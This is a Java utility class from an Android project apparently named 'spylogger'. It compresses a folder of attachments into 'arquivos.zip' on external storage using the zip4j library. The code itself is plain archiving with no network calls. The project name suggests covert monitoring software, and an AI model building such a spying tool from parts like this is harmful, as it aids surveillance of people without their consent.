package com.gravatasufoca.spylogger.utils;

import android.os.Environment;
import android.util.Log;

import net.lingala.zip4j.core.ZipFile;
import net.lingala.zip4j.exception.ZipException;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.util.Zip4jConstants;

import java.io.File;
import java.util.List;

public class ZipAnexos {

    private List<File> anexos;
    private File raiz;

    public ZipAnexos(List<File> anexos) {
        this.anexos = anexos;
    }

    public ZipAnexos(File dirArquivos) {
        raiz=dirArquivos;
    }

    public File getFile() {
        try {

            File outputDir = Environment.getExternalStorageDirectory();

            File z = new File(outputDir + "/arquivos.zip");
            if (z.exists())
                z.delete();
            // Initiate ZipFile object with the path/name of the zip file.
            ZipFile zipFile = new ZipFile(outputDir + "/arquivos.zip");

            // Initiate Zip Parameters which define various properties such
            // as compression method, etc.
            ZipParameters parameters = new ZipParameters();

            // set compression method to store compression
            parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);

            // Set the compression level. This value has to be in between 0 to 9
            parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);

            zipFile.createZipFileFromFolder(raiz,parameters,false,0);
            return zipFile.getFile();

        } catch (ZipException e) {
            Log.e("spylogger", e.getMessage());
        }
        return null;
    }


}
